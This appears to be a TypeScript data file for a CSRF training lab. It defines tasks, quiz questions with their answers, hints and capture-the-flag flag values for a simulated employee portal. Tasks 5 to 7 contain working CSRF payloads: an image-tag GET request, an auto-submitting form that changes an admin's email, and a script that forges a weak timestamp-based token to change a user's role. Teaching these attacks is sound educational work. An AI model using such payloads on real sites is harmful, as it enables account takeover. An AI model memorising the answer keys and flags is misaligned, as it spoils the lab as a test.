export interface TaskQuestion {
  id: string;
  text: string;
  answer: string;
  options?: string[];
  placeholder?: string;
  xp: number;
}

export interface Task {
  id: string;
  number: number;
  title: string;
  category: string;
  xp: number;
  description: string;
  content: string;
  questions: TaskQuestion[];
  hints: string[];
  hasFlag: boolean;
  flagValue?: string;
  flagXp?: number;
}

export const questionPools: Record<string, TaskQuestion[]> = {
  task2: [
    {
      id: 'q2_1',
      text: 'What type of relationship does CSRF abuse between the browser and web application?',
      answer: 'trust',
      options: ['trust', 'encryption', 'inheritance', 'polymorphism'],
      xp: 20,
    },
    {
      id: 'q2_2',
      text: 'What does the browser automatically include with requests to a website you are authenticated to?',
      answer: 'cookies',
      options: ['cookies', 'jwt tokens', 'authorization headers', 'ip addresses'],
      xp: 20,
    },
    {
      id: 'q2_3',
      text: 'In a CSRF scenario, who does the web application assume initiated the malicious request?',
      answer: 'The authenticated user',
      options: ['The authenticated user', 'The attacker', 'The proxy server', 'The browser manufacturer'],
      xp: 20,
    },
    {
      id: 'q2_4',
      text: 'Which of the following is another common abbreviation for CSRF?',
      answer: 'XSRF',
      options: ['XSRF', 'CRSF', 'XSS', 'CORS'],
      xp: 20,
    },
    {
      id: 'q2_5',
      text: 'What does CSRF stand for?',
      answer: 'Cross-Site Request Forgery',
      options: ['Cross-Site Request Forgery', 'Cross-Site Resource Fetching', 'Client-Side Request Failure', 'Cross-Server Resource Framing'],
      xp: 20,
    },
    {
      id: 'q2_6',
      text: 'Which HTTP feature makes CSRF possible by automatically attaching credentials?',
      answer: 'Cookie-based session management',
      options: ['Cookie-based session management', 'TLS handshake', 'DNS resolution', 'HTTP/2 multiplexing'],
      xp: 20,
    },
    {
      id: 'q2_7',
      text: 'In CSRF, does the attacker need to steal the victim\'s session cookie?',
      answer: 'No, the browser sends it automatically',
      options: ['No, the browser sends it automatically', 'Yes, via XSS first', 'Yes, via packet sniffing', 'Yes, via social engineering'],
      xp: 20,
    },
    {
      id: 'q2_8',
      text: 'Which party is tricked into performing the unwanted action in a CSRF attack?',
      answer: 'The victim\'s browser',
      options: ['The victim\'s browser', 'The web server', 'The DNS resolver', 'The attacker\'s proxy'],
      xp: 20,
    },
    {
      id: 'q2_9',
      text: 'What is the attacker\'s primary goal in a CSRF attack?',
      answer: 'Force the victim to perform an unintended action',
      options: ['Force the victim to perform an unintended action', 'Steal the victim\'s password', 'Read the victim\'s private data', 'Crash the server'],
      xp: 20,
    },
    {
      id: 'q2_10',
      text: 'Can the attacker read the server\'s response to a CSRF request from a cross-origin page?',
      answer: 'No, Same-Origin Policy blocks it',
      options: ['No, Same-Origin Policy blocks it', 'Yes, always', 'Yes, if using HTTPS', 'No, but only on Firefox'],
      xp: 20,
    },
  ],
  task3: [
    {
      id: 'q3_1',
      text: 'What type of action must the target endpoint perform for CSRF to be useful to an attacker?',
      answer: 'state-changing',
      options: ['state-changing', 'read-only', 'idempotent', 'stateless'],
      xp: 20,
    },
    {
      id: 'q3_2',
      text: 'If the server only checks that a request has valid session cookies, what is it failing to verify?',
      answer: 'origin',
      options: ['origin', 'destination', 'payload size', 'http method'],
      xp: 20,
    },
    {
      id: 'q3_3',
      text: "Why can't an attacker read the server's response to a CSRF request directly from their page?",
      answer: 'Same-Origin Policy (SOP)',
      options: ['Same-Origin Policy (SOP)', 'Content Security Policy (CSP)', 'CORS settings', 'HTTPS encryption'],
      xp: 20,
    },
    {
      id: 'q3_4',
      text: 'Does sending requests via HTTP POST instead of GET prevent CSRF attacks?',
      answer: 'No, forms can be auto-submitted via JS',
      options: [
        'No, forms can be auto-submitted via JS',
        'Yes, POST blocks cross-site cookies',
        'Yes, POST requires Origin headers',
        'No, browsers convert POST to GET automatically'
      ],
      xp: 20,
    },
    {
      id: 'q3_5',
      text: 'Which of the following is NOT a condition required for a CSRF attack?',
      answer: 'Ability to read the server response',
      options: ['Ability to read the server response', 'A relevant state-changing action', 'Cookie-based session handling', 'No unpredictable request parameters'],
      xp: 20,
    },
    {
      id: 'q3_6',
      text: 'Which type of request is generally NOT useful for CSRF exploitation?',
      answer: 'A read-only data retrieval request',
      options: ['A read-only data retrieval request', 'A password change request', 'An email update request', 'A fund transfer request'],
      xp: 20,
    },
    {
      id: 'q3_7',
      text: 'What makes an endpoint\'s parameters "predictable" in the context of CSRF?',
      answer: 'An attacker can determine all required values in advance',
      options: [
        'An attacker can determine all required values in advance',
        'The parameters are encrypted',
        'The endpoint uses HTTPS',
        'The parameters change every second'
      ],
      xp: 20,
    },
    {
      id: 'q3_8',
      text: 'How many conditions must be met simultaneously for an endpoint to be CSRF-exploitable?',
      answer: 'Three',
      options: ['Three', 'One', 'Two', 'Five'],
      xp: 20,
    },
    {
      id: 'q3_9',
      text: 'An endpoint that deletes a user account with no CSRF token is an example of which CSRF condition?',
      answer: 'A relevant state-changing action with predictable parameters',
      options: [
        'A relevant state-changing action with predictable parameters',
        'A safe read-only endpoint',
        'An idempotent operation',
        'A stateless REST call'
      ],
      xp: 20,
    },
    {
      id: 'q3_10',
      text: 'Why is CSRF categorised as a "confused deputy" attack?',
      answer: 'The browser acts on behalf of the attacker unknowingly',
      options: [
        'The browser acts on behalf of the attacker unknowingly',
        'The server confuses GET and POST',
        'The attacker tricks the firewall',
        'DNS responses are confused with HTTP'
      ],
      xp: 20,
    },
  ],
  task4: [
    {
      id: 'q4_1',
      text: 'What HTTP method do developers sometimes incorrectly assume is safe from CSRF?',
      answer: 'POST',
      options: ['POST', 'GET', 'PUT', 'DELETE'],
      xp: 30,
    },
    {
      id: 'q4_2',
      text: 'What is the common name for the protection mechanism that generates unique tokens per session?',
      answer: 'csrf-tokens',
      options: ['csrf-tokens', 'jwt-tokens', 'session-ids', 'api-keys'],
      xp: 30,
    },
    {
      id: 'q4_3',
      text: 'When inspecting a form in DevTools for CSRF vulnerability, what is the main indicator of risk?',
      answer: 'Absence of an anti-CSRF token input',
      options: [
        'Absence of an anti-CSRF token input',
        'Presence of hidden inputs',
        'Use of standard POST method',
        'Action attribute pointing to localhost'
      ],
      xp: 30,
    },
    {
      id: 'q4_4',
      text: 'Which tool is commonly used to inspect HTTP request payloads and search for missing tokens?',
      answer: 'Browser Developer Tools (Network Tab)',
      options: ['Browser Developer Tools (Network Tab)', 'Subfinder', 'Nmap', 'Wireshark'],
      xp: 30,
    },
    {
      id: 'q4_5',
      text: 'What should you look for in the request body to confirm a form has CSRF protection?',
      answer: 'A hidden input field with a unique token value',
      options: ['A hidden input field with a unique token value', 'An Authorization header', 'A CAPTCHA challenge', 'An encrypted password field'],
      xp: 30,
    },
    {
      id: 'q4_6',
      text: 'Which browser DevTools tab lets you inspect the exact HTTP request body and headers sent by a form?',
      answer: 'Network tab',
      options: ['Network tab', 'Elements tab', 'Console tab', 'Sources tab'],
      xp: 30,
    },
    {
      id: 'q4_7',
      text: 'If a form uses autocomplete="off", does this protect against CSRF?',
      answer: 'No, autocomplete is unrelated to CSRF',
      options: ['No, autocomplete is unrelated to CSRF', 'Yes, it blocks forged submissions', 'Yes, it hides the form fields', 'Only if combined with CAPTCHA'],
      xp: 30,
    },
    {
      id: 'q4_8',
      text: 'During reconnaissance, what type of endpoints are the highest priority for CSRF testing?',
      answer: 'State-changing endpoints authenticated via cookies',
      options: [
        'State-changing endpoints authenticated via cookies',
        'Public read-only API endpoints',
        'Static file-serving endpoints',
        'Health check endpoints'
      ],
      xp: 30,
    },
    {
      id: 'q4_9',
      text: 'An endpoint protected by a Referer header check but no CSRF token is:',
      answer: 'Partially protected and potentially bypassable',
      options: [
        'Partially protected and potentially bypassable',
        'Fully protected against CSRF',
        'Immune to all cross-origin attacks',
        'Only exploitable via GET'
      ],
      xp: 30,
    },
  ],
  task7: [
    {
      id: 'q6_1',
      text: 'What encoding scheme is used for the CSRF token in Task 7?',
      answer: 'base64',
      options: ['base64', 'hex', 'url-encode', 'rot13'],
      xp: 20,
    },
    {
      id: 'q6_2',
      text: "If a CSRF token's format is username:timestamp, what type of vulnerability is this?",
      answer: 'Predictable Token Generation',
      options: ['Predictable Token Generation', 'Broken Access Control', 'SQL Injection', 'Lack of encryption'],
      xp: 20,
    },
    {
      id: 'q6_3',
      text: 'Which character is typically used as a padding character in Base64 encoded strings?',
      answer: '=',
      options: ['=', '+', '/', '%'],
      xp: 20,
    },
    {
      id: 'q6_4',
      text: 'What JavaScript function encodes a string into Base64?',
      answer: 'btoa()',
      options: ['btoa()', 'atob()', 'encodeURI()', 'parseInt()'],
      xp: 20,
    },
    {
      id: 'q6_5',
      text: 'What JavaScript function decodes a Base64 string back to plain text?',
      answer: 'atob()',
      options: ['atob()', 'btoa()', 'decodeURI()', 'JSON.parse()'],
      xp: 20,
    },
    {
      id: 'q6_6',
      text: 'Why is using a timestamp as part of a CSRF token considered weak?',
      answer: 'Timestamps are predictable and can be guessed',
      options: [
        'Timestamps are predictable and can be guessed',
        'Timestamps make tokens too long',
        'Timestamps cause encoding errors',
        'Timestamps expire too quickly'
      ],
      xp: 20,
    },
    {
      id: 'q6_7',
      text: 'A properly secure CSRF token should be generated using:',
      answer: 'A cryptographically secure random number generator',
      options: [
        'A cryptographically secure random number generator',
        'The current Unix timestamp',
        'The user\'s username hashed with MD5',
        'A counter that increments each request'
      ],
      xp: 20,
    },
    {
      id: 'q6_8',
      text: 'If you decode a CSRF token and find "boby:171752", what does 171752 likely represent?',
      answer: 'A minute-level Unix timestamp',
      options: ['A minute-level Unix timestamp', 'A random session ID', 'An IP address hash', 'A user privilege level'],
      xp: 20,
    },
  ],
  task8: [
    {
      id: 'q7_1',
      text: 'Which SameSite cookie attribute provides the strongest CSRF protection?',
      answer: 'Strict',
      options: ['Strict', 'Lax', 'None', 'Secure'],
      xp: 25,
    },
    {
      id: 'q7_2',
      text: 'Which SameSite value is the default in modern browsers?',
      answer: 'Lax',
      options: ['Strict', 'Lax', 'None', 'Secure'],
      xp: 25,
    },
    {
      id: 'q7_3',
      text: 'Besides CSRF tokens and SameSite cookies, what HTTP header can be validated to verify request origin?',
      answer: 'Origin',
      options: ['Origin', 'User-Agent', 'Accept', 'Content-Type'],
      xp: 25,
    },
    {
      id: 'q7_4',
      text: 'To work properly, where should anti-CSRF tokens be validated?',
      answer: 'On the server-side',
      options: ['On the server-side', 'On the client-side via JS', 'In the Nginx proxy router', 'Inside the browser cache'],
      xp: 25,
    },
    {
      id: 'q7_5',
      text: 'What security attribute must be paired with SameSite=None to prevent browsers from rejecting the cookie?',
      answer: 'Secure',
      options: ['Secure', 'HttpOnly', 'Path=/', 'Max-Age'],
      xp: 25,
    },
    {
      id: 'q7_6',
      text: 'With SameSite=Lax, which type of cross-site request will still include the cookie?',
      answer: 'Top-level navigation GET requests',
      options: ['Top-level navigation GET requests', 'Cross-site POST forms', 'Background fetch() calls', 'Image tag requests'],
      xp: 25,
    },
    {
      id: 'q7_7',
      text: 'What is the "Synchronizer Token Pattern" in CSRF defence?',
      answer: 'Server generates a unique token per session and validates it on each state-changing request',
      options: [
        'Server generates a unique token per session and validates it on each state-changing request',
        'Client generates tokens and sends them in cookies',
        'Browser compares request timestamps',
        'Proxy server filters out forged requests'
      ],
      xp: 25,
    },
    {
      id: 'q7_8',
      text: 'Why is SameSite=Strict not always practical for all cookies?',
      answer: 'It blocks cookies even on legitimate top-level link navigations',
      options: [
        'It blocks cookies even on legitimate top-level link navigations',
        'It is not supported by any browser',
        'It only works with HTTPS',
        'It makes cookies expire immediately'
      ],
      xp: 25,
    },
    {
      id: 'q7_9',
      text: 'The "Double Submit Cookie" pattern works by:',
      answer: 'Sending the token in both a cookie and a request parameter, then comparing them',
      options: [
        'Sending the token in both a cookie and a request parameter, then comparing them',
        'Encrypting the cookie twice',
        'Requiring two separate login steps',
        'Sending two identical requests simultaneously'
      ],
      xp: 25,
    },
    {
      id: 'q7_10',
      text: 'Which HTTP header does the server check to determine if a request came from its own domain?',
      answer: 'Referer',
      options: ['Referer', 'Host', 'X-Forwarded-For', 'Accept-Language'],
      xp: 25,
    },
  ],
};

export const tasks: Task[] = [
  {
    id: 'task1',
    number: 1,
    title: 'Introduction',
    category: 'Setup',
    xp: 10,
    description: 'Deploy the environment and inspect the architecture.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Deploy the laboratory environment and inspect the StaffHub Employee Portal.
      </div>
      <h3>Sandbox Access Details:</h3>
      <ul>
        <li>🖥️ <strong>Lab Portal:</strong> Renders current tasks and tools.</li>
        <li>🌐 <strong>StaffHub:</strong> Simulated employee portal where updates are performed.</li>
        <li>⚔️ <strong>Workshop:</strong> HTML editor to craft and simulate exploits.</li>
      </ul>
      <h3>Objectives & Checklist:</h3>
      <ul>
        <li>✅ Navigate between the <strong>Task Guide</strong>, <strong>StaffHub Portal</strong>, and <strong>Attack Workshop</strong>.</li>
        <li>✅ Locate the credentials panel in the sidebar: <code>boby</code> / <code>seedboby</code> and <code>alice</code> / <code>seedalice</code>.</li>
        <li>✅ Confirm workspace connectivity.</li>
      </ul>
    `,
    questions: [],
    hints: [],
    hasFlag: false,
  },
  {
    id: 'task2',
    number: 2,
    title: 'What is CSRF?',
    category: 'Theory',
    xp: 40,
    description: 'Understand the fundamentals of Cross-Site Request Forgery attacks.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Learn the browser trust mechanism that makes CSRF possible.
      </div>
      <h3>CSRF Flow:</h3>
      <div class="code-block">
        <pre><code>1. Victim signs in -> Server issues Cookie
2. Cookie stored in Browser
3. Attacker page triggers request to Server -> Browser attaches Cookie automatically!</code></pre>
      </div>
      <h3>The Trust Gap:</h3>
      <ul>
        <li>The browser automatically attaches matching cookies on requests, regardless of which page initiated it.</li>
        <li>The server trusts valid session cookies, failing to verify the request's origin.</li>
      </ul>
    `,
    questions: [], // Populated dynamically per student session
    hints: [
      'Think about what makes CSRF possible — why does the server accept the forged request?',
      'The attack works because the server trusts something that comes with every request from an authenticated user.',
      'Session cookies are the mechanism that browsers use to maintain authentication state.',
    ],
    hasFlag: false,
  },
  {
    id: 'task3',
    number: 3,
    title: 'Why CSRF Works',
    category: 'Theory',
    xp: 40,
    description: 'Learn the conditions that make CSRF attacks possible.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Understand the conditions required for a CSRF vulnerability to exist.
      </div>
      <h3>The CSRF Triad:</h3>
      <ol>
        <li><strong>State-Changing Action:</strong> Modifies server data (e.g., email updates) rather than reading it.</li>
        <li><strong>Cookie-Based Auth:</strong> The application relies solely on session cookies for validation.</li>
        <li><strong>Predictable Parameters:</strong> Request payloads contain no secret or unpredictable values (tokens).</li>
      </ol>
      <div class="warning-box">
        <strong>💡 Note:</strong> Using <code>POST</code> rather than <code>GET</code> does NOT prevent CSRF, as HTML forms can be auto-submitted via JavaScript.
      </div>
    `,
    questions: [], // Populated dynamically per student session
    hints: [
      'CSRF is useless for read-only operations because the attacker cannot read the response. The valuable targets are operations that change data.',
      'The type of action that modifies server-side data is called a "state-changing" action.',
      'The server needs to verify WHERE the request came from — which site initiated it.',
    ],
    hasFlag: false,
  },
  {
    id: 'task4',
    number: 4,
    title: 'Finding CSRF Vulnerabilities',
    category: 'Recon',
    xp: 60,
    description: 'Learn to identify CSRF vulnerabilities in the StaffHub application.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Perform reconnaissance on StaffHub settings to detect vulnerable forms.
      </div>
      <h3>Recon Actions:</h3>
      <ol>
        <li>Navigate to the <strong>StaffHub Portal</strong> tab.</li>
        <li>Log in as <code>boby</code> with password <code>seedboby</code>.</li>
        <li>Open settings and change the email address.</li>
        <li>Inspect the request payload in browser DevTools (F12) -> Network tab:
          <pre><code>POST /api/app/settings/email
Cookie: staffhub_session=...
{"email": "new@email.com"}
// Note: No anti-CSRF token is present or verified!</code></pre>
        </li>
      </ol>
    `,
    questions: [], // Populated dynamically per student session
    hints: [
      'Think about which HTTP method developers often think provides protection against CSRF because it cannot be triggered by an IMG tag.',
      'POST requests can still be triggered by auto-submitting HTML forms — they are NOT safe from CSRF.',
      'The standard defense mechanism involves generating a unique, unpredictable token for each session/request. These are commonly called CSRF tokens or anti-CSRF tokens.',
    ],
    hasFlag: false,
  },
  {
    id: 'task5',
    number: 5,
    title: 'Exploitation — GET Request Attack',
    category: 'Exploit',
    xp: 80,
    description: "Craft a CSRF attack using a GET request (e.g., inside an image tag) to modify the victim's profile status.",
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Exploit a GET-based state-changing endpoint on StaffHub by embedding a malicious GET request in an image source.
      </div>
      <h3>GET-based State-Changing Vulnerabilities</h3>
      <p>When a web application uses HTTP GET requests to perform actions that modify server data (such as updating profile status, transferring funds, or changing settings), it is extremely easy to exploit via CSRF.</p>
      <p>Since browsers automatically load image sources (via the <code>&lt;img src="..."&gt;</code> tag) by sending GET requests to the specified URL (including session cookies), an attacker can trigger the request silently without needing any form submission or user interaction beyond viewing the page.</p>
      <h3>Action Steps:</h3>
      <ol>
        <li>Log into the <strong>StaffHub Portal</strong> as <code>boby</code> / <code>seedboby</code> and check the profile status settings. Note that the status update uses a GET request: <code>GET /api/app/settings/status?status=your_status</code>.</li>
        <li>Go to the <strong>Attack Workshop</strong> tab.</li>
        <li>Select the **GET Image** template or write HTML embedding an image tag whose <code>src</code> attribute points to the victim's status update endpoint:
          <pre><code>&lt;img src="/api/app/settings/status?status=Hacked!" width="1" height="1" /&gt;</code></pre>
        </li>
        <li>Click <strong>"Simulate Victim Visit"</strong>. When Alice (the admin) visits your page, her browser will load the image source, sending her session cookie and changing her status message to <code>Hacked!</code>. This will unlock the flag.</li>
      </ol>
    `,
    questions: [],
    hints: [
      'The status update endpoint accepts a GET query parameter: /api/app/settings/status?status=...',
      'You don\'t need a form for GET requests; a simple <img src="..."> tag pointing to the status endpoint works perfectly.',
      'To change Alice\'s status to the target value, use: <img src="/api/app/settings/status?status=Hacked!">',
    ],
    hasFlag: true,
    flagValue: 'THM{CSRF_GET_Request_Exploit_99}',
    flagXp: 80,
  },
  {
    id: 'task6',
    number: 6,
    title: 'Exploitation — HTML Form Attack',
    category: 'Exploit',
    xp: 100,
    description: "Craft a CSRF exploit to change the admin's email address.",
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Craft an auto-submitting HTML form to change Alice's email.
      </div>
      <h3>Attack Objectives:</h3>
      <ul>
        <li>Target: <code>/api/app/settings/email</code></li>
        <li>Action: Update email value to <code>attacker@evilmail.thm</code></li>
      </ul>
      <h3>Form Attack Template:</h3>
      <div class="code-block">
        <pre><code>&lt;form id="csrf-form" action="/api/app/settings/email" method="POST"&gt;
  &lt;input type="hidden" name="email" value="attacker@evilmail.thm" /&gt;
&lt;/form&gt;
&lt;script&gt;
  document.getElementById('csrf-form').submit();
&lt;/script&gt;</code></pre>
      </div>
      <h3>Action Steps:</h3>
      <ol>
        <li>Copy the template into the **Attack Workshop** editor.</li>
        <li>Click **"Simulate Victim Visit"** to execute and retrieve the flag.</li>
      </ol>
    `,
    questions: [],
    hints: [
      'Your form needs an action attribute pointing to the email update endpoint: /api/app/settings/email',
      'Make sure you have a hidden input with name="email" and value="attacker@evilmail.thm".',
      'Add a <script> tag after the form that calls document.getElementById("csrf-form").submit() to auto-submit.',
      'Complete working example:\n<form id="csrf-form" action="/api/app/settings/email" method="POST">\n  <input type="hidden" name="email" value="attacker@evilmail.thm" />\n</form>\n<script>document.getElementById("csrf-form").submit();</script>',
    ],
    hasFlag: true,
    flagValue: 'THM{CSRF_Email_Hijacked_001}',
    flagXp: 100,
  },
  {
    id: 'task7',
    number: 7,
    title: 'Exploitation — Weak Token Bypass',
    category: 'Exploit',
    xp: 100,
    description: 'Bypass a weak CSRF token implementation to change user roles.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Demote Alice's role to staff by bypassing a weak CSRF token check.
      </div>
      <h3>Predictable Token Formula:</h3>
      <ul>
        <li>Decoded boby token format: <code>username:timestamp</code>.</li>
        <li>Weak token generator: <code>base64(username + ":" + Math.floor(Date.now() / 60000))</code>.</li>
      </ul>
      <h3>Action Steps:</h3>
      <ol>
        <li>Go to the **Attack Workshop** tab.</li>
        <li>Create a POST form targeting <code>/api/app/settings/role</code> with parameters: <code>username=alice</code>, <code>role=staff</code>.</li>
        <li>Write a script block to dynamically calculate the Base64 token for alice, or use the dynamic auto-bypass template:
          <pre><code>&lt;script&gt;
  const timestamp = Math.floor(Date.now() / 60000);
  const token = btoa("alice:" + timestamp);
  document.getElementById('token-input').value = token;
&lt;/script&gt;</code></pre>
        </li>
        <li>Click **"Simulate Victim Visit"** to demote Alice and retrieve the flag.</li>
      </ol>
    `,
    questions: [], // Populated dynamically per student session
    hints: [
      'First, get a CSRF token by calling GET /api/app/csrf-token while logged in as boby. Examine the token format.',
      'The token is Base64 encoded. Decode it to see the pattern: username:minuteTimestamp.',
      'To forge a token for alice, compute: btoa("alice:" + Math.floor(Date.now() / 60000))',
      'Complete attack: Create a form with action="/api/app/settings/role", include hidden inputs for username=alice, role=staff, and csrf_token=your_forged_token. Use JavaScript to compute the token and auto-submit.',
    ],
    hasFlag: true,
    flagValue: 'THM{Weak_Token_Bypassed_007}',
    flagXp: 80,
  },
  {
    id: 'task8',
    number: 8,
    title: 'CSRF Defenses',
    category: 'Defense',
    xp: 100,
    description: 'Learn industry-standard defenses against CSRF attacks.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Learn the core industry mitigations for CSRF.
      </div>
      <h3>Three Pillars of Mitigation:</h3>
      <ol>
        <li>🛡️ <strong>Anti-CSRF Tokens:</strong> Cryptographically random, single-use values checked server-side.</li>
        <li>🛡️ <strong>SameSite Cookie Attribute:</strong> tells the browser when to send cookies:
          <ul>
            <li><code>Strict</code>: Never sent on cross-site requests.</li>
            <li><code>Lax</code> (modern default): Sent only on top-level GET navigations.</li>
            <li><code>None</code>: Sent on all requests (requires Secure).</li>
          </ul>
        </li>
        <li>🛡️ <strong>Origin Validation:</strong> Inspecting HTTP <code>Origin</code>/<code>Referer</code> headers.</li>
      </ol>
      <div class="warning-box">
        <strong>💡 Action:</strong> Complete the interactive SameSite Cookie matrix below by clicking and revealing all cells, then click <strong>"Complete Demo"</strong>.
      </div>
    `,
    questions: [], // Populated dynamically per student session
    hints: [
      'SameSite=Strict prevents the cookie from being sent on ANY cross-site request, providing the strongest protection.',
      'Modern browsers (Chrome 80+, Firefox 86+, Edge 86+) default to SameSite=Lax when no attribute is specified.',
      'The Origin header and Referer header both indicate where a request originated from. Either can be validated server-side.',
    ],
    hasFlag: false,
  },
  {
    id: 'task9',
    number: 9,
    title: 'Conclusion',
    category: 'Summary',
    xp: 50,
    description: 'Summary and further learning resources.',
    content: `
      <div class="info-box">
        <strong>🎯 Aim:</strong> Review key concepts learned.
      </div>
      <h3>Review of Core Learnings:</h3>
      <ul>
        <li>✅ CSRF exploits browser-server trust models.</li>
        <li>✅ Browsers automatically attach cookies unless mitigated.</li>
        <li>✅ Standard POST forms do NOT block cross-site execution.</li>
        <li>✅ Tokens must be cryptographically secure and unpredictable.</li>
        <li>✅ Defense-in-depth combines tokens, SameSite cookies, and Origin validation.</li>
      </ul>
    `,
    questions: [],
    hints: [],
    hasFlag: false,
  },
];
